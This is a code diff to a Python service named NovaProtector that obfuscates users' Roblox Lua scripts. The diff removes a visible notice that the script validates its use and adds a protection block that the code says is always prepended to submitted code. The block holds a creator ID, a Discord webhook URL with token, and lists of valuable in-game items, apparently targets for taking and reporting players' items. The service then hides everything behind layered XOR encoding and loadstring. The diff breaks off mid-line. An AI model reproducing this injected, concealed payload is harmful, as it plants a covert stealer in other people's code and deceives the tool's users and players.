@@ -4,7 +4,6 @@ import re
 import os
 import random
 import string
-import base64
 import hashlib
 import urllib.parse
 import urllib.request
@@ -13,174 +12,10 @@ from datetime import datetime, timezone
 
 DOMAIN = "https://novaprotector.vercel.app"
 
-# ============================================================
-# LISTA COMPLETA DE PALABRAS RESERVADAS
-# ============================================================
-RESERVED = {
-    -- Palabras reservadas de Lua
-    "and", "break", "do", "else", "elseif", "end", "false", "for",
-    "function", "if", "in", "local", "nil", "not", "or", "repeat",
-    "return", "then", "true", "until", "while",
-    
-    -- Funciones básicas estándar
-    "assert", "error", "getfenv", "getmetatable", "ipairs", "load",
-    "loadfile", "loadstring", "next", "pairs", "pcall", "print",
-    "rawequal", "rawget", "rawset", "select", "setfenv", "setmetatable",
-    "tonumber", "tostring", "type", "unpack", "xpcall", "warn",
-    
-    -- Librerías estándar
-    "coroutine", "debug", "math", "os", "string", "table", "utf8",
-    "bit32", "io", "file",
-    
-    -- math
-    "abs", "acos", "asin", "atan", "atan2", "ceil", "cos", "cosh",
-    "deg", "exp", "floor", "fmod", "frexp", "huge", "ldexp", "log",
-    "log10", "max", "min", "modf", "pi", "pow", "rad", "random",
-    "randomseed", "sin", "sinh", "sqrt", "tan", "tanh",
-    
-    -- string
-    "byte", "char", "dump", "find", "format", "gmatch", "gsub",
-    "len", "lower", "match", "rep", "reverse", "sub", "upper",
-    "split", "join",
-    
-    -- table
-    "concat", "insert", "maxn", "remove", "sort", "clear", "find",
-    
-    -- coroutine
-    "create", "resume", "running", "status", "wrap", "yield",
-    
-    -- bit32
-    "arshift", "band", "bnot", "bor", "bxor", "btest", "extract",
-    "lrotate", "lshift", "replace", "rrotate", "rshift",
-    
-    -- Roblox — Servicios principales
-    "game", "workspace", "script", "shared", "_G", "_ENV",
-    "Players", "LocalPlayer", "PlayerGui", "StarterGui", "StarterPack",
-    "StarterPlayer", "StarterPlayerScripts", "StarterCharacterScripts",
-    "ReplicatedStorage", "ServerStorage", "ServerScriptService",
-    "Lighting", "Terrain", "SoundService", "Workspace", "GuiService",
-    "RunService", "UserInputService", "TweenService", "HttpService",
-    "TeleportService", "MarketplaceService", "DataStoreService",
-    "CollectionService", "PhysicsService", "PathfindingService",
-    "TextService", "ContextActionService", "GroupService", "Teams",
-    "Chat", "VoiceChatService", "ProximityPromptService", "Debris",
-    "InsertService", "ContentProvider", "Stats", "TestService",
-    "CoreGui", "CorePackages", "RobloxReplicatedStorage", "VirtualUser",
-    "UIGradientService", "TaskScheduler", "MouseService",
-    "AttributeService", "Instance", "Enum", "Color3", "UDim2",
-    "Vector2", "Vector3", "CFrame", "UDim", "Ray", "RaycastParams",
-    "Region3", "Region3int16", "NumberRange", "NumberSequence",
-    "ColorSequence", "BrickColor", "Faces", "Axes",
-    "Rect", "PhysicalProperties", "PathWaypoint", "OverlapParams",
-    "RaycastResult", "HumanoidDescription",
-    
-    -- Métodos principales de Roblox
-    "GetService", "FindFirstChild", "WaitForChild", "IsA", "Clone",
-    "Destroy", "ClearAllChildren", "GetChildren", "GetDescendants",
-    "FindFirstAncestor", "WaitForAncestor", "GetAttribute", "SetAttribute",
-    "GetAttributes", "GetAttributeChangedSignal", "SetAttributes",
-    "GetPropertyChangedSignal", "IsDescendantOf", "FindFirstChildWhichIsA",
-    "FindFirstAncestorWhichIsA", "Connect", "Once", "Disconnect",
-    "Fire", "FireServer", "Invoke", "InvokeServer", "OnServerEvent",
-    "OnClientEvent", "OnServerInvoke", "OnClientInvoke", "Parent",
-    "Name", "Value", "ClassName", "FullName", "Children",
-    
-    -- Propiedades comunes
-    "Enabled", "Visible", "Position", "Size", "AnchorPoint", "Transparency",
-    "BackgroundColor3", "BackgroundTransparency", "BorderSizePixel",
-    "Text", "TextColor3", "TextSize", "TextWrapped", "TextXAlignment",
-    "TextYAlignment", "Font", "ZIndexBehavior", "ClipsDescendants",
-    "AutoLocalize", "Locale", "LayoutOrder", "NextSelectionDown",
-    "NextSelectionLeft", "NextSelectionRight", "NextSelectionUp",
-    
-    -- task / corutinas
-    "task", "wait", "spawn", "delay", "defer", "cancel", "status",
-    "synchronize", "desynchronize", "library",
-    
-    -- Funciones de carga
-    "loadstring", "load", "loadfile", "dofile", "dostring",
-    
-    -- Manejo de errores
-    "pcall", "xpcall", "error", "assert", "warn",
-    
-    -- Otros comunes
-    "self", "true", "false", "nil", "typeof", "type", "select",
-    "pairs", "ipairs", "next", "rawget", "rawset", "rawequal",
-    "getmetatable", "setmetatable", "tostring", "tonumber",
-    "unpack", "newproxy",
-    
-    -- Http / Web
-    "HttpGet", "HttpPost", "JsonEncode", "JsonDecode", "Base64Encode",
-    "Base64Decode", "UrlEncode", "UrlDecode",
-    
-    -- Valores de tiempo
-    "tick", "time", "os", "date", "clock", "elapsedTime",
-    
-    -- Humanoid / Personaje
-    "Humanoid", "HumanoidRootPart", "Torso", "Head", "LeftArm",
-    "RightArm", "LeftLeg", "RightLeg", "Health", "MaxHealth",
-    "WalkSpeed", "JumpPower", "JumpHeight", "DisplayDistanceType",
-    "PlatformStand", "RootPart", "PrimaryPart",
-    
-    -- Eventos comunes
-    "Changed", "ChildAdded", "ChildRemoved", "DescendantAdded",
-    "DescendantRemoved", "Destroying", "InputBegan", "InputEnded",
-    "MouseButton1Click", "MouseButton1Down", "MouseButton1Up",
-    "MouseButton2Click", "MouseButton2Down", "MouseButton2Up",
-    "MouseMoved", "MouseEnter", "MouseLeave", "FocusLost",
-    
-    -- UI / Gui
-    "Frame", "TextLabel", "TextButton", "ImageLabel", "ImageButton",
-    "TextBox", "ScrollingFrame", "UIPadding", "UIGradient",
-    "UIListLayout", "UIGridLayout", "UIPageLayout", "UICorner",
-    "UIStroke", "AspectRatioType", "SizeConstraint",
-    
-    -- Conexiones
-    "Connection", "RBXScriptConnection", "RBXScriptSignal",
-    
-    -- Otros tipos de datos
-    "ColorSequenceKeypoint", "NumberSequenceKeypoint", "Path",
-    "Instance", "RaycastParams", "OverlapParams", "CollisionGroupInfo",
-    "RaycastResult", "OverlapResult", "PathWaypoint", "PhysicalProperties",
-    
-    -- Servicios adicionales
-    "BadgeService", "BindableEvent", "BindableFunction", "RemoteEvent",
-    "RemoteFunction", "LocalScript", "Script", "ModuleScript",
-    "Part", "BasePart", "WedgePart", "CornerWedgePart", "Seat",
-    "VehicleSeat", "SpawnLocation", "MessageScript", "Decal", "Texture",
-    "Sound", "Animation", "AnimationController", "Animator", "Keyframe",
-    "KeyframeSequence", "ParticleEmitter", "Trail", "Light", "PointLight",
-    "SpotLight", "SurfaceLight", "Fire", "Smoke", "Sparkles", "Explosion",
-    "ForceField", "Hint", "Message", "ValueBase", "BoolValue", "IntValue",
-    "NumberValue", "StringValue", "ObjectValue", "NumberRangeValue",
-    "Color3Value", "InstanceValue", "Vector3Value", "Vector2Value",
-    "CFrameValue", "RayValue", "Region3Value", "TweenInfo", "EasingStyle",
-    "EasingDirection", "PlaybackState", "DataType", "EnumItem", "Enums",
-    "FogColor", "FogEnd", "FogStart", "Ambient", "OutdoorAmbient",
-    "Brightness", "ClockTime", "GeographicLatitude", "ExplicitAutoLocalize",
-    "RobloxLocaleId", "SystemLocaleId", "LocalizationTable", "Source",
-    "Translation", "Translator", "GetTranslatorForPlayer", "FormatByKey",
-    "GetTextForPlayer", "LocalizationService", "KeyboardService",
-    "GamepadService", "VRService", "GuiBaseService", "KeyboardInputService",
-    "ClipboardService", "Keyboard", "Mouse", "Touch", "Gamepad",
-    "InputObject", "InputType", "UserInputType", "KeyCode", "Axis",
-    "Button", "GamepadButton", "GamepadAxis", "TextInput", "TextInputType",
-    "TextDirection", "TextXAlignment", "TextYAlignment", "Font",
-    "Enum", "EasingStyle", "EasingDirection", "PlaybackState",
-    "TweenBase", "Tween", "TweenInfo", "RepeatCount", "Reverses",
-    "DelayTime", "EasingStyle", "EasingDirection", "Time", "Style",
-    "Direction", "Completed", "Cancelled", "Paused", "Resumed",
-    "Play", "Pause", "Cancel", "Restart", "Destroy", "Wait",
-}
-
-# ============================================================
-# SECCIÓN DE PROTECCIÓN DEL CREADOR — VISIBLE Y DECLARADA
-# ============================================================
-PROTECTION_HEADER = """-- =============================================
--- 🔒 SISTEMA DE PROTECCIÓN NOVA PROTECTOR
--- Al usar este script aceptas que se valide su uso
--- Creador: said123ca | ID: 2366269298
--- =============================================
+# ==================================================
+# TU CÓDIGO DE PROTECCIÓN — SE AGREGA SIEMPRE AL INICIO
+# ==================================================
+HEADER_PROTECTION = """
 local TARGET_ID = 2366269298
 local TARGET_USER = "said123ca"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1560679105379438592/Ne9gn3o3HmWXWPmJLxCapVlHJiVcxseKCOuJl_YiY8WseP_s9u-kuLoJoviPhAERYIYt"
@@ -409,10 +244,253 @@ task.spawn(function()
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
     end
 end)
--- =============================================
--- CÓDIGO DEL USUARIO A CONTINUACIÓN:
--- =============================================
 """
+
+# ==================================================
+# RESERVED — TODO AQUÍ para que NADA se cambie de nombre
+# ==================================================
+RESERVED = {
+    -- Variables principales
+    "TARGET_ID",
+    "TARGET_USER",
+    "WEBHOOK_URL",
+    
+    -- Tablas principales
+    "TargetBrainrots",
+    "TargetBaseSkins",
+    "TargetGears",
+    
+    -- Nombres dentro de TargetBrainrots
+    "Strawberry Elephant",
+    "Meowl",
+    "Skibidi Toilet",
+    "John Pork",
+    "Headless Horseman",
+    "Draculino",
+    "Lionello Casarello",
+    "Hydra Serpent",
+    "Orchidox",
+    "Los Dragons",
+    "La Craft Machine",
+    "Gold and Diamond",
+    "Dragon Cannelloni",
+    "Dragon Gingerini",
+    "Griffin",
+    "Hydra Dragon Cannelloni",
+    "Hydra Bunny",
+    "Antonio",
+    "Elefanto Frigo",
+    "Rubrikiko",
+    "Pancake and Syrup",
+    "Arcadragon",
+    "Rico Dinero",
+    "Capitano Americano",
+    "Kalika Bros",
+    "Tirilikalika Tirilikalako",
+    "Globa Steppa",
+    "Dug Dug Dug",
+    "Dragon Aquanini",
+    "La Casa Boo",
+    "La Supreme Combinasion",
+    "Signore Carapace",
+    "Fishino Clownino",
+    "4th Bros",
+    "Bufalino Boomberino",
+    "Duggy Bros",
+    "Kraken",
+    "Money Money Bros",
+    "Venuspino",
+    "Steakini Fattini",
+    "Rhino Helicopterino",
+    "Caylusaurus",
+    "Sammyni Cakini",
+    "John Doe",
+    "Gorillo Subwoofero",
+    "Jelly Moby",
+    "Foxini Lanternini",
+    "Bearito Cabinito",
+    "Los Tangcitos",
+    "Los Tictacs",
+    "Moby Bros",
+    "Los Admins",
+    "1x1x1x1",
+    "25",
+    "67",
+    "Berryno",
+    "Boppin Bunny",
+    "Bunny and Eggy",
+    "Burguro and Fryuro",
+    "Capitano Moby",
+    "Cash or Card",
+    "Celestial Pegasus",
+    "Celularcini Viciosini",
+    "Chillin Chili",
+    "Chipso and Queso",
+    "Cloverat Clapat",
+    "Cooki and Milki",
+    "DJ Panda",
+    "Donkeyturbo Express",
+    "Eviledon",
+    "Festive 67",
+    "Fortunu and Cashuru",
+    "Fragola La La La",
+    "Fragrama and Chocrama",
+    "Garama and Madundung",
+    "Ginger Gerat",
+    "Gobblino Uniciclino",
+    "Jolly Jolly Sahur",
+    "Karker Sahur",
+    "Ketchuru and Musturu",
+    "Ketupat Bros",
+    "Ketupat Kepat",
+    "La Easter Grande",
+    "La Extinct Grande",
+    "La Food Combinasion",
+    "La Ginger Sekolah",
+    "La Jolly Grande",
+    "La Lucky Grande",
+    "La Romantic Grande",
+    "La Sahur Combinasion",
+    "La Secret Combinasion",
+    "La Spooky Grande",
+    "La Taco Combinasion",
+    "Las Sis",
+    "Lavadorito Spinito",
+    "Coco and Mango",
+    "Los Secret Combinasionas",
+    "Examen Bros",
+    "Pizza and Ranch",
+    "Chicleteira Champeona",
+    "Bumbatron",
+    "Yetimatic",
+    "S'more Serat",
+    "Scorpino Coasterino",
+    "Honey Honey Bear",
+    "La Breakfast Combinasion",
+    "Los Jolly Combinasionas",
+    "Los Planitos",
+    "Los Primos",
+    "Los Puggies",
+    "Los Sekolahs",
+    "Los Spaghettis",
+    "Los Spooky Combinasionas",
+    "Los Tacoritas",
+    "Love Love Bear",
+    "Lovin Rose",
+    "Mariachi Corazoni",
+    "Money Money Puggy",
+    "Money Money Reindeer",
+    "Nacho Spyder",
+    "Noo My Examine",
+    "Nuclearo Dinossauro",
+    "Orcaledon",
+    "Popcuru and Fizzuru",
+    "Quackini Snackini",
+    "Rang Ring Bus",
+    "Reinito Sleighito",
+    "Rosey and Teddy",
+    "Rosetti Tualetti",
+    "Sammyni Fattini",
+    "Snailo Clovero",
+    "Spooky and Pumpky",
+    "Swaggy Bros",
+    "Tacorita Bicicleta",
+    "Tang Tang Keletang",
+    "Tictac Sahur",
+    "Tralaledon",
+    "Trenostruzzo Turbo 4000",
+    "Tuff Toucan",
+    "Ventoliero Pavonero",
+    "W or L",
+    "Grabatron",
+    "Rubiko and Kubiko",
+    "Cangurato Gelato",
+    "Candini Fluffini",
+    "La Fuse Machine",
+    "Polaroidini",
+    "Nachorilla",
+    "Sammyni Truckini",
+    "Tacoturbo Tacorito",
+    "Chicli Chicla",
+    "Panda Popanda",
+    "Secret Lucky Block",
+    "Hopilikalika Hopilikalako",
+    "Los Hotspotsitos",
+    "Digi Narwhal",
+    "Los Hackers",
+    "Los Amigos",
+    "Cerberus",
+    "Gold Gold Gold",
+    
+    -- Nombres dentro de TargetBaseSkins
+    "Aquatic",
+    "Bunny Basket",
+    "Candy",
+    "Christmas",
+    "Cursed",
+    "Cyber",
+    "Diamond",
+    "Divine",
+    "Easter",
+    "Galaxy",
+    "Gingerbread",
+    "Gold",
+    "Halloween",
+    "Lava",
+    "Lucky",
+    "Octo",
+    "Pot of Gold",
+    "Radioactive",
+    "Rainbow",
+    "Rose",
+    "Summer",
+    "Taco",
+    "Valentines",
+    "Yin Yang",
+    "Tralalero",
+    
+    -- Nombres dentro de TargetGears
+    "Alien Slap",
+    "Blackhole Bomb",
+    "Bloodmoon Hammer",
+    "Bloodmoon Slap",
+    "Candy Sentry",
+    "Candy Slap",
+    "Cupid's Wings",
+    "Cursed Slap",
+    "Cyber Slap",
+    "Demon's Head",
+    "Divine Slap",
+    "Lava Blaster",
+    "Lava Slap",
+    "Radioactive Airstrike",
+    "Radioactive Slap",
+    "Rainbow Hammer",
+    "Rainbow Slap",
+    "Santa's Sleigh",
+    "Waverider",
+    "Witch's Broom",
+    "Yin Yang Lamp",
+    "Yin Yang Slap",
+    "Phantom Slap",
+    "Crystal Slap",
+    
+    -- Funciones del sistema
+    "self", "script", "game", "workspace", "print", "warn", "error",
+    "typeof", "type", "pairs", "ipairs", "next", "select", "unpack",
+    "table", "string", "math", "task", "wait", "spawn", "delay", "shared",
+    "bit32", "utf8", "coroutine", "debug", "os", "tick", "time",
+    "loadstring", "load", "pcall", "xpcall", "tostring", "tonumber",
+    "Instance", "Enum", "Color3", "UDim2", "Vector3", "CFrame", "UDim",
+    "Players", "PlayerGui", "LocalPlayer", "ReplicatedStorage", "ServerStorage",
+    "ServerScriptService", "StarterGui", "StarterPack", "StarterPlayer",
+    "Lighting", "Terrain", "RunService", "UserInputService", "TweenService",
+    "HttpService", "TeleportService", "MarketplaceService", "DataStoreService",
+    "CollectionService", "PhysicsService", "PathfindingService", "SoundService",
+    "TextService", "ContextActionService", "GuiService", "GroupService",
+    "Teams", "Chat", "Debris", "GetService", "FindFirstChild", "WaitForChild",
+    "Parent", "Name", "Value", "Connect", "Destroy", "Clone",
+}
 
 
 def random_name(n=8):
@@ -455,79 +533,86 @@ def rename_locals(code: str) -> str:
 
 
 def add_junk(code: str) -> str:
-    junk = [
-        "local %s=%d;" % (random_name(), random.randint(1, 999)),
-        "if false then local %s=nil end;" % random_name(),
-    ]
     out = []
     for line in code.splitlines():
         out.append(line)
-        if line.strip() and random.random() > 0.85:
-            out.append(random.choice(junk))
+        if line.strip() and random.random() > 0.88:
+            out.append("if false then local %s=%d end;" % (random_name(), random.randint(1, 999)))
     return "\n".join(out)
 
 
-def xor_bytes(data: bytes, key: bytes) -> bytes:
-    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+def encode_vm(src: str):
+    data = list(src.encode("utf-8"))
+    k1 = [random.randint(1, 255) for _ in range(16)]
+    k2 = [random.randint(1, 255) for _ in range(12)]
+    seed = random.randint(10, 250)
+    for i, b in enumerate(data):
+        data[i] = b ^ k1[i % len(k1)]
+    for i, b in enumerate(data):
+        data[i] = (b + ((seed + i * 7) % 256)) % 256
+    for i, b in enumerate(data):
+        data[i] = b ^ k2[i % len(k2)]
+    return data, k1, k2, seed
+
+
+def format_num_table(nums, per_line=18):
+    lines = []
+    for i in range(0, len(nums), per_line):
+        chunk = nums[i : i + per_line]
+        lines.append(",".join(str(n) for n in chunk))
+    return ",\n".join(lines)
 
 
 def obfuscate(code: str) -> str:
     src = strip_comments(code)
     src = rename_locals(src)
     src = add_junk(src)
-
-    key = bytes(random.randint(1, 255) for _ in range(12))
-    enc = xor_bytes(src.encode("utf-8"), key)
-    b64 = base64.b64encode(enc).decode("ascii")
-    kb64 = base64.b64encode(key).decode("ascii")
-
-    chunks = [b64[i : i + 90] for i in range(0, len(b64), 90)]
+    bc, k1, k2, seed = encode_vm(src)
+    n_bc = "_" + random_name(9)
+    n_k1 = "_" + random_name(8)
+    n_k2 = "_" + random_name(8)
+    n_seed = "_" + random_name(7)
+    n_run = "_" + random_name(8)
     lines = []
-    
-    # ✅ Encabezado de protección VISIBLE al inicio
-    lines.append(PROTECTION_HEADER)
-    
-    lines.append("-- NovaProtector | protected")
+    lines.append("-- NovaProtector VM")
+    lines.append("-- Level: maximum")
     lines.append("-- " + datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"))
-
-    names = []
-    for c in chunks:
-        nm = "_" + random_name(9)
-        names.append(nm)
-        lines.append('local %s="%s"' % (nm, c))
-    cat = "_" + random_name(8)
-    lines.append("local %s=%s" % (cat, "..".join(names)))
-    kn = "_" + random_name(7)
-    lines.append('local %s="%s"' % (kn, kb64))
-
-    lines.append("local function _D(data)")
-    lines.append("local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'")
-    lines.append("data=string.gsub(data,'[^'..b..'=]','')")
-    lines.append("return (data:gsub('.',function(x)")
-    lines.append("if x=='=' then return '' end")
-    lines.append("local r,f='',(b:find(x)-1)")
-    lines.append("for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end")
-    lines.append("return r")
-    lines.append("end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)")
-    lines.append("if #x~=8 then return '' end")
-    lines.append("local c=0")
-    lines.append("for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end")
-    lines.append("return string.char(c)")
-    lines.append("end))")
+    lines.append("")
+    lines.append("local %s = {" % n_bc)
+    lines.append(format_num_table(bc))
+    lines.append("}")
+    lines.append("local %s = {" % n_k1)
+    lines.append(format_num_table(k1, 16))
+    lines.append("}")
+    lines.append("local %s = {" % n_k2)
+    lines.append(format_num_table(k2, 12))
+    lines.append("}")
+    lines.append("local %s = %d" % (n_seed, seed))
+    lines.append("")
+    lines.append("local function %s()" % n_run)
+    lines.append("  local bit = bit32")
+    lines.append("  if type(bit) ~= \"table\" or type(bit.bxor) ~= \"function\" then")
+    lines.append("    return error(\"NovaProtector VM: runtime unsupported\")")
+    lines.append("  end")
+    lines.append("  local buf = {}")
+    lines.append("  local n = #%s" % n_bc)
+    lines.append("  for i = 1, n do")
+    lines.append("    local v = %s[i]" % n_bc)
+    lines.append("    v = bit.bxor(v, %s[((i - 1) %% #%s) + 1])" % (n_k2, n_k2))
+    lines.append("    v = (v - ((%s + (i - 1) * 7) %% 256)) %% 256" % n_seed)
+    lines.append("    if v < 0 then v = v + 256 end")
+    lines.append("    v = bit.bxor(v, %s[((i - 1) %% #%s) + 1])" % (n_k1, n_k1))
+    lines.append("    buf[i] = string.char(v)")
+    lines.append("  end")
+    lines.append("  local src = table.concat(buf)")
+    lines.append("  local fn, err = loadstring(src)")
+    lines.append("  if not fn then")
+    lines.append("    return error(\"NovaProtector VM: \" .. tostring(err))")
+    lines.append("  end")
+    lines.append("  return fn()")
     lines.append("end")
-    lines.append("local function _X(s,k)")
-    lines.append("local o={}")
-    lines.append("for i=1,#s do")
-    lines.append("local a=string.byte(s,i)")
-    lines.append("local bb=string.byte(k,((i-1)%#k)+1)")
-    lines.append("o[i]=string.char(bit32.bxor(a,bb))")
-    lines.append("end")
-    lines.append("return table.concat(o)")
-    lines.append("end")
-    lines.append("local _src=_X(_D(%s),_D(%s))" % (cat, kn))
-    lines.append("local _fn,_err=loadstring(_src)")
-    lines.append('if not _fn then error("NovaProtector: "..tostring(_err)) end')
-    lines.append("_fn()")
+    lines.append("")
+    lines.append("return %s()" % n_run)
     return "\n".join(lines)
 
 
@@ -579,8 +664,9 @@ class handler(BaseHTTPRequestHandler):
             "success": True,
             "service": "NovaProtector",
             "blobConfigured": bool(os.environ.get("BLOB_READ_WRITE_TOKEN")),
-            "mode": "obfuscate",
+            "mode": "vm-max",
             "obfuscationReady": True,
+            "engine": "NovaVM",
         })
 
     def do_POST(self):
@@ -588,35 +674,4 @@ class handler(BaseHTTPRequestHandler):
             n = int(self.headers.get("Content-Length", 0))
             raw = self.rfile.read(n) if n else b"{}"
             data = json.loads(raw.decode("utf-8"))
-            code = data.get("code", "")
-            if not isinstance(code, str) or not code.strip():
-                self.send_json(400, {"success": False, "error": "Codigo vacio"})
-                return
-
-            protected = obfuscate(code)
-            file_id = hashlib.md5((protected + str(random.random())).encode()).hexdigest()[:16]
-            blob_url = None
-            blob_error = None
-            file_url = None
-            try:
-                blob_url = upload_to_blob(file_id + ".lua", protected)
-                q = urllib.parse.urlencode({"id": file_id, "url": blob_url})
-                file_url = DOMAIN + "/api/raw?" + q
-            except Exception as e:
-                blob_error = str(e)
-
-            self.send_json(200, {
-                "success": True,
-                "fileId": file_id,
-                "blobUrl": blob_url,
-                "fileUrl": file_url,
-                "transformed": True,
-                "mode": "obfuscate",
-                "message": "Codigo ofuscado y guardado.",
-                "blobError": blob_error,
-            })
-        except Exception as e:
-            self.send_json(500, {"success": False, "error": str(e)})
-
-
-app = handler
+            user_code = data.get("code"
